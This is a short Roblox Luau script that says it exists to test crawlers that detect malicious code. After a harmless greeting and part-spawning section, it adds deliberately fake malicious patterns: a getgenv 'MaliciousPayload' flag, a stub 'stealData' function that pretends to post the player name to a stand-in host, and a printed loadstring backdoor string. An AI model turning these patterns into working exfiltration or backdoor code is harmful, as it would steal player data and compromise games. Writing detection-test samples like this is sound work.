-- this is a non malicous script this is for testing webcrawlers to block malicous code 

--// Harmless, real Luau code
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local function greet()
    print("Hello, " .. player.Name .. "! This is a test script.")
end

greet()

local function movePart()
    local part = Instance.new("Part")
    part.Size = Vector3.new(5, 1, 5)
    part.Position = Vector3.new(0, 10, 0)
    part.Anchored = true
    part.Parent = workspace
end

movePart()

--// BEGIN: Fake malicious-looking code for crawler testing

local genv = getgenv and getgenv() or {} -- simulate malicious-style use of globals
genv["MaliciousPayload"] = true -- fake malicious flag

-- Attempted fake exploit pattern
local function stealData()
    -- NOTE: This doesn't do anything
    local fakeHttp = {
        PostAsync = function(self, url, data)
            warn("Pretending to send data to: " .. url)
            warn("Data: " .. data)
        end
    }

    fakeHttp:PostAsync("http://not-actually-evil.com/steal", "username=" .. player.Name)
end

stealData()

-- Simulate backdoor-like behavior
local function fakeBackdoor()
    local code = "loadstring('print(\"You have been hacked\")')"
    print("Executing fake backdoor: " .. code)
    -- DO NOT ACTUALLY EXECUTE
end

fakeBackdoor()

--// END: Fake malicious-looking code
